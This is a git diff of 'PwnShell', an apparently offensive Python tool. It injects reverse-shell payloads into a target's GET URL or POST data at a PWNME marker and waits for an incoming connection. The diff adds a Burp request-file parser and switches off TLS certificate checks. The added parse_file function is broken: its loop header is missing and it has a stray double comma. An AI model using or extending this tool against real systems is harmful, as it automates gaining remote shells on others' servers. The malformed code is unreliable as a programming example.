@@ -15,6 +15,7 @@ import urllib.parse
 from payloads import PayLoads
 import time
 import socket
+import burpee
 
 
 class PwnShell:
@@ -27,15 +28,16 @@ class PwnShell:
         self.method = args.method
         self.data = args.data
         self.authentication = args.auth
-        self.typ=args.type
+        self.type=args.type
+        self.file=args.file
         ########################################################################
         ###################### Specifying OS ###################################
-        if self.typ == "linux" or self.typ == "l":
+        if self.type == "linux" or self.type == "l":
             self.shell_linux()
-        elif self.typ == "windows" or self.typ == "w":
+        elif self.type == "windows" or self.type == "w":
             self.shell_windows()
         else:
-            print("[!]Invalid Value -> " + self.typ)
+            print("[!]Invalid Value -> " + self.type)
             exit_gracefully()
         ######################################################################
 
@@ -48,11 +50,12 @@ class PwnShell:
             print('[*]PASSWORD : %s' % self.authentication[1])
         print('\n[!]Waiting for a Connection ....\n')
 
-    #########################################################################################
+    ####################################################################################
     ###################################  LINUX #########################################
 
     def shell_linux(self):  # Default option
         self.info()
+        self.parse_file()
         #self.login()
         self.is_valid()
         self.thread()  # leave it the last one
@@ -131,22 +134,27 @@ class PwnShell:
             return s.connect_ex(('localhost', self.port)) == 0
 
     ############################################################################################
-    ###################################  LOOPING THE PAYLOADS #################################
+    ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
         payloads = PayLoads(self.ip, self.port).payloads()
-        if self.method == 'post':
+        if self.method == 'post' or self.method == 'POST':
             for payload in payloads:
                 self.req_post(payload)
                 time.sleep(5)
                 if self.is_port_in_use():
                     break
                 # Here we have to stop the loop after getting a shell in the second thread
-        elif self.method == 'get':
+        elif self.method == 'get' or self.method == 'GET':
             print('get method')
             for payload in payloads:
                 self.req_get(payload)
+        elif self.file :
+            for payload in payloads:
+                self.req_get(payload)
+            self.parse_file()  #this also sends the request
         else:
             return False
+
     #########################################################################################
     ###################################  POST METHOD #########################################
     def req_post(self, payload):
@@ -164,7 +172,7 @@ class PwnShell:
             data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
         else:
             data_parsed = None
-        r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies)
+        r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies,verify=False)
 
     #########################################################################################
     ###################################  GET METHOD #########################################
@@ -174,13 +182,31 @@ class PwnShell:
         url = self.domain.replace('PWNME', self.payload)  # payload will be the revshells
         proxies = {'http': 'http://127.0.0.1:8080'}
         cookies = ''
-        r = requests.get(url, cookies=cookies)
+        r = requests.get(url, cookies=cookies,verify=False)
 
     #########################################################################################
     ###################################  LOGIN   ############################################
 
     def login(self):
         pass
+
+    ######################################################################################
+    ###################################  PARSER BURPREQUEST #################################
+    def parse_file(self):
+        proxies={'https': 'https://127.0.0.1:8080'}
+        request , post_data = burpee.parse_request(self.file) #Don;t change
+            if request[r] == "PWNME":
+                request[r] = request[r].replace("PWNME",'PAYLOAD') #THE PAYLOAD
+            if r == "Host":
+                url='https://'+request[r]   #CONCATE WITH PATH
+        
+        if post_data :
+            post_data = post_data.replace("PWNME",'PAYLOAD')
+            req=requests.post(url,headers=request,data=post_data,,verify=False)
+            print(req.status_code)
+        else:
+            req=requests.get(url,headers=request,verify=False)
+            print(req.status_code)
 
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
@@ -222,9 +248,9 @@ if __name__ == '__main__':
         parser.add_argument("-d", "--data", help='Post data')
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
-        parser.add_argument(
-            "-m", "--method", help='Request Method', default='post')
+        parser.add_argument("-m", "--method", help='Request Method', default='post')
         parser.add_argument("-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
+        parser.add_argument("-f", "--file", help='Request file')
         args = parser.parse_args()
         ########################################################################
         ########################## Defining variables ##########################
